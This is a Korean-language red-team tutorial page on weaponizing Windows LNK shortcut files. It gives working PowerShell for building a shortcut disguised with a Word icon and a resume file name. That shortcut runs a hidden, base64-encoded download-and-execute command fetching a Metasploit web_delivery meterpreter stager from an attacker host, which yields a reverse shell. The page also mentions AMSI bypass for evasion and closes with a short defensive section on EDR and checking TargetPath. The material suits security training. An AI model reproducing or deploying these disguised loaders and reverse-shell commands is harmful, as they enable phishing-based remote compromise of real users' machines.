# LNK

윈도우의 바로가기 파일은 `.LNK` 확장자를 갖고 있으며, 최대 255자의 `targetpath` 파라미터와 4096자의 `argument` 를 실행할 수 있다. 초기 침투 시 단일 파일로 사용될 수도 있지만, 짧은 커맨드 길이 때문에 다른 페이로드들을 실행시키는데 더 자주 사용된다.&#x20;

수 많은 조합들이 있지만, 자주 사용 되는 조합은 다음과 같다.&#x20;

* lnk -> Powershell -> 인 메모리 실행&#x20;
* lnk -> .dll download -> DLL side loading / DLL hijacking / LOLBAS with regsvr32.dll&#x20;
* lnk -> Powershell -> HTA&#x20;
* lnk -> .exe + DLL sideloading&#x20;

DLL 사이드로딩과 관련된 APT 29의 LNK + DLL Sideloading 기법은 다음 페이지에서 볼 수 있다 (TODO)&#x20;

### 실습&#x20;

다음은 `cmd.exe` 바이너리를 실행하는 간단한 LNK 파일을 만드는 파워쉘 명령어다.&#x20;

```
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\opt\lnk\Choi_Resume_CV_Dialog.lnk")
$link.windowstyle = "7"
$link.targetpath = "%windir%/system32/cmd.exe"
$link.iconlocation = "C:\Program Files (x86)\Microsoft Office\root\Office16\WORDICON.exe"
$link.arguments = "/c start cmd.exe"
$link.save()
```

마이크로소프트 워드의 아이콘을 갖은 LNK 파일을 생성해낸다. 오른쪽 클릭해서 shortcut을 확인해보면 `Target` 에 위에서 만든 페이로드인 `%windir%/system32/cmd.exe` 를 실행한다.&#x20;

![](<../../.gitbook/assets/image (10) (1).png>)

### 실습 - 2&#x20;

다음은 파워쉘 페이로드를 가져와 메모리상에서 실행하는 방법이다. 악용을 막기 위해 AMSI bypass 등은 실행하지 않는다. 먼저 개념 증명용 페이로드를 위해 메타스플로잇을 사용한다.&#x20;

```
msfconsole 
use exploit/multi/script/web_delivery
set pyaload windows/x64/meterpreter/reverse_https 
set lhost <ip> 
set lport <port> 
exploit 

[*] Exploit running as background job 5.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.40.182:443
[*] Using URL: http://192.168.40.182:8080/3XQSv3
[*] Server started.
[*] Run the following command on the target machine:
msf6 exploit(multi/script/web_delivery) > powershell.exe -nop -w hidden -e <....>
```

웹 딜리버리를 실행시키면 스테이저 파일이 호스팅된 URL이 나온다. 위 예시의 경우 `http://192.168.40.182:8080/3XQSv3` 여기에 스테이저가 호스팅 되어 있다. 따라서 해당 파일을 메모리상에서 실행하는 LNK 파일을 만들어준다.&#x20;

```
$command = 'iex(new-object net.webclient).downloadstring("http://192.168.40.182:8080/3XQSv3")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\testdefender\Choi_Resume.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files (x86)\Microsoft Office\root\Office16\WORDICON.exe"
$link.arguments = "-Nop -w hidden -enc $($encodedCommand)"
$link.save()
```

작전 보안과 방어 우회를 위해서는 호스팅 되어있는 스테이저 파일에 AMSI 우회 코드를 넣어주면 된다. 이 실습은 개념 증명용이니 넘어간다. 해당 LNK 파일을 만들고 실행하면 리버스 쉘을 받을 수 있다.&#x20;



### 대응 방안&#x20;

LNK 파일은 윈도우의 기본적인 바로가기 파일이기 때문에 기술적으로 비활성화 시킬수는 없다. 단, LNK 파일의 `targetPath` 과 `arugments` 에 들어가는 페이로드는 엔드포인트의 디스크위에 쓰일 수 밖에 없다. 따라서 AV/EDR 등의 엔드포인트 방어 솔루션들이 LNK 파일을 잘 분석한다면 충분히 막을 수 있을 것이다. 실제로 간단한 파워쉘 페이로드를 실행시키려고 하면 왠만한 페이로드들은 모두 막힌다.&#x20;

엔드 유저의 입장에서는 LNK 파일에 주의한다. LNK 파일은 기본적으로 확장자가 보이지 않기 때문에 파일 익스플로러에서 `Shortcut` 혹은 `바로가기` 가 있다면 오른쪽 클릭을 해서 `TargetPath` 를 한 번 살펴보는 습관을 들인다.&#x20;

![](<../../.gitbook/assets/image (7) (2).png>)



### 레퍼런스&#x20;

{% embed url="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/" %}

{% embed url="https://docs.google.com/viewerng/viewer?url=https://adsecurity.org/wp-content/uploads/2016/09/DerbyCon6-2016-AttackingEvilCorp-Anatomy-of-a-Corporate-Hack-Presented.pdf" %}
